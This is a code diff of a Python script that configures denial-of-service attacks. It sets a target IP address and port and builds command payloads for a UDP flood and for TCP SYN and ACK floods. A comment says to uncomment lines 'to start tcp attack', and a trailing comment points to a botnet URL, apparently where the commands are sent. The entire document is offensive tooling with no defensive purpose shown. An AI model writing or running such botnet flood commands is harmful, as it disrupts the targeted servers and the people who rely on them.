@@ -2,17 +2,21 @@ import requests
 
 # IP that you want to attack
 IP = '192.168.200.52'
+# Port that you want to attack
+port = 80
 
 # ---------------------------tcp_attack -----------------------------
 # -------mode-------
 # S: SYN Flood
 # A: ACK Flood
 # ------------------
-# my_data = {'attack':'tcp_attack', 'IP':IP, 'port':'80', 'mode':'A'}
+# Uncomment these to start tcp attack--------------------------------
+# mode = 'A'
+# my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port, 'mode':mode}
 # -------------------------------------------------------------------
 
 # ---------------------------udp_attack------------------------------
-my_data = {'attack':'udp_attack', 'IP':IP, 'port':'80'}
+my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
 # -------------------------------------------------------------------
 
 # Botnet URL
